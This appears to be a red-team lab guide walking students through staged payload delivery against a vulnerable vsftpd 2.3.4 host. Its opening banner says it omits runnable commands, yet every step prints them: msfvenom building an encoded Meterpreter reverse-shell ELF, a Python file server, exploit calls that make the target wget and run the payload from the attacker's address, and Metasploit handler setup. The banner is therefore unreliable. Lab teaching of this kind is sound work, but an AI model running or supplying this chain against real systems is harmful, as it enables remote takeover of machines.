## Process Overview: “Staged Payload Delivery” in a Controlled Lab (Conceptual)

> **Safety boundary**
> This section describes the *concepts* behind a staged payload delivery workflow used in red-team style labs.
> It intentionally omits copy/paste commands, exact module/payload strings, and runnable parameters.

---

### 1) Select an Appropriate Payload (Architecture + Callback Model)

**Goal:** Choose a payload that matches the target environment and the intended session type.

**What’s happening conceptually:**
- You enumerate available payloads and filter them by:
  - **Target OS** (Linux vs Windows)
  - **CPU architecture** (x86 vs x64)
  - **Connection model** (reverse connection back to the attacker)
  - **Session type** (e.g., interactive agent vs basic shell)

**Why it matters:**
- A payload must match the target’s **OS/CPU** or it will fail to execute.
- A reverse connection requires:
  - The attacker machine to be reachable from the target on the chosen **listener port**
  - Correctly chosen **network interface** (lab NIC vs NAT NIC)

**Evidence students should capture:**
- A short note: “Selected payload type because target is `<OS>/<ARCH>` and we need `<session capability>`.”
- Any constraints discovered (restricted egress ports, limited tooling on target, etc.).

```
msfvenom --list payloads | grep reverse | grep meterpreter | grep linux | grep x86 | grep -v cmd
```

---

### 2) Generate the Payload Artifact (Executable Format + Constraints)

**Goal:** Produce an executable artifact that can run on the target and call back to the listener.

**What’s happening conceptually:**
- You generate a platform-appropriate binary (e.g., Linux ELF) configured to:
  - Connect back to `<ATTACKER_IP>:<LISTEN_PORT>`
  - Avoid problematic characters if the delivery vector requires it (so the payload isn’t truncated or corrupted)
  - Optionally apply **encoding/obfuscation** to alter byte patterns (this does *not* guarantee evasion; it’s commonly used to demonstrate how signatures can be brittle)

**Instructor talking points:**
- “Bad characters” are bytes that break a delivery channel (string parsing, protocol handling, command wrapping).
- Encoding can change the payload’s byte signature but may increase size and complexity.

**Evidence students should capture:**
- Artifact name + file type (e.g., “ELF executable”)
- A checksum (hash) for reporting repeatability and integrity
- Where the artifact is stored on the attacker VM

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=1337 -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -i 10 -f elf -o revshell.elf
```
---

### 3) Stage a Simple File Host for Transfer (Lab-Only)

**Goal:** Provide a lightweight way for the target to download the artifact.

**What’s happening conceptually:**
- You start a simple web server in the directory containing the payload, making it available at:
  - `http://<ATTACKER_IP>:<HTTP_PORT>/<ARTIFACT_NAME>`

**Why it matters:**
- This is a common technique for quick transfer in labs because:
  - It requires minimal setup
  - It’s easy to observe traffic and logs

**Evidence students should capture:**
- Server start confirmation (port, directory)
- The exact URL the target would fetch (as a placeholder in the report)

```
python3 -m http.server 9001
```
---

### 4) Use the Existing RCE Primitive to Deliver Commands (Instructor-Led Demo)

**Goal:** Use a known remote command execution capability to instruct the target to retrieve the staged artifact.

**What’s happening conceptually:**
- An RCE vulnerability is used as a “command runner” on the target.
- You issue a **non-interactive** command that makes the target:
  1) Fetch the payload from the attacker’s HTTP server  
  2) Save it to a writable location on the target

**Important note:**
- The exploit/RCE vector is a *delivery mechanism* here—students should treat it as:
  - “We have a way to run a command remotely”
  - And focus on **what evidence proves that command execution occurred**

**Evidence students should capture:**
- HTTP server logs showing an inbound request for the artifact
- On-target proof the file exists (size, timestamp)
- A brief note of where it was written (path)

```
python vsftpd_234_exploit.py 192.168.56.103 21 "which wget"
python vsftpd_234_exploit.py 192.168.56.103 21 "wget http://192.168.56.104:9001/revshell.elf"
python vsftpd_234_exploit.py 192.168.56.103 21 "ls -la"
```
---

### 5) Set Execute Permissions and Validate Placement (Conceptual)

**Goal:** Prepare the artifact for execution and verify everything is aligned.

**What’s happening conceptually:**
- Many Linux targets require execute permission on a file before it can run.
- You verify:
  - File presence and permissions
  - Ownership and timestamps
  - The working directory and filesystem location

**Evidence students should capture:**
- Directory listing evidence showing the artifact and its permissions
- Any errors (permission denied, path not found, tool missing)

```
python vsftpd_234_exploit.py 192.168.56.103 21 "chmod +x revshell.elf"
python vsftpd_234_exploit.py 192.168.56.103 21 "ls -la"
```
---

### 6) Configure the Listener/Handler (Must Match the Payload)

**Goal:** Prepare the attacker-side listener to accept the reverse connection.

**What’s happening conceptually:**
- You configure a handler that exactly matches:
  - **Payload type**
  - **Listener interface** (lab NIC)
  - **Listener port**
- You run the handler in a way that can accept sessions while you continue operating (commonly as a background job).

**Key teaching point:**
- **Payload and handler must match**. Mismatches are one of the #1 causes of “it didn’t connect back.”

**Evidence students should capture:**
- A screenshot showing handler configuration fields (sanitized, no copy/paste commands)
- The “listening” state confirmation

```
msfdb run
use exploit/multi/handler
options
set payload linux/x86/meterpreter/reverse_tcp
options
set LHOST eth1
set LPORT 1337
exploit -j -z
```
Turn back back to the terminal that you use for RCE and run the backdoor

```
python vsftpd_234_exploit.py 192.168.56.103 21 "./revshell.elf"
```
---

### 7) Post-Connection Validation (Minimal, Non-Destructive)

**Goal:** Confirm session context and stabilize the interaction without damaging the system.

**What’s happening conceptually:**
- You run minimal validation such as:
  - Identity/context checks (who you are, where you are)
  - Basic filesystem checks
- Optionally, you “upgrade” a limited shell to a more usable interactive session if the environment supports it.

**Evidence students should capture:**
- A short transcript proving:
  - Session opened successfully
  - Effective user context
  - Basic command execution works

---

## Common Failure Points (Troubleshooting Checklist)

- **Wrong architecture** (x86 vs x64 mismatch)
- **Wrong interface** (listener bound to NAT instead of lab NIC)
- **Egress blocked** (target can’t reach attacker port)
- **Artifact not executable** (permissions)
- **Delivery tool missing** (target lacks common fetch utilities)
- **Handler/payload mismatch** (different payload type than listener expects)
